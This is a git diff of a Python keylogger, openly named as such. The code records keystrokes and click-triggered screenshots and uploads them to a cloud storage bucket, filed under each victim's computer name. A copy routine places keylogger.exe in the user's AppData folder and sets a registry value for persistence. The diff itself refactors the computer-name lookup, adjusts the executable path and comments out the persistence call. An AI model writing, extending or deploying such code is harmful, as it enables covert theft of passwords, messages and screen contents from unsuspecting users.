@@ -33,6 +33,7 @@ lastThreeKeys = []
 countDelete = 0
 clicks_counter = 0
 imgPath = 'screenshot.jpg'
+pcName = os.environ['COMPUTERNAME']
 
 
 def on_press(key):
@@ -45,7 +46,7 @@ def on_press(key):
         if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
             f.close()
 
-            storage.child(os.environ['COMPUTERNAME'] +
+            storage.child(pcName +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
 
@@ -55,10 +56,10 @@ def on_press(key):
         elif len(data) % 20 == 0:
             f.close()
 
-            storage.child(os.environ['COMPUTERNAME'] +
+            storage.child(pcName +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
-
+            print('!')
             f = open('data.txt', 'a+', encoding='utf-8')
         printKey(key)
     except Exception as e:
@@ -128,7 +129,7 @@ def on_click(x, y, button, pressed):
                 full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
                 today_date = full_currentTime.split(' ')[1]
 
-                storage.child(os.environ['COMPUTERNAME'] +
+                storage.child(pcName +
                               '/screenshot_' + full_currentTime + '.jpg') \
                     .put(imgPath)
         except Exception as e:
@@ -137,7 +138,7 @@ def on_click(x, y, button, pressed):
 
 def copy_script():
     USER_NAME = getpass.getuser()
-    src = 'dist\\keylogger.exe'
+    src = str(os.getcwd()) + '\\keylogger.exe'
     dst = r'C:\Users\%s\AppData' % USER_NAME
     shutil.copy2(src, dst)
     exePath = 'C:\\Users\\%s\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
@@ -148,7 +149,7 @@ def copy_script():
                       winreg.REG_SZ, exePath)  # file_path is path of file after coping it
 
 
-copy_script()
+# copy_script()
 
 # Collect events of mouse clicks and keyboard keys
 with keyboard.Listener(on_press=on_press) as k_listener, \
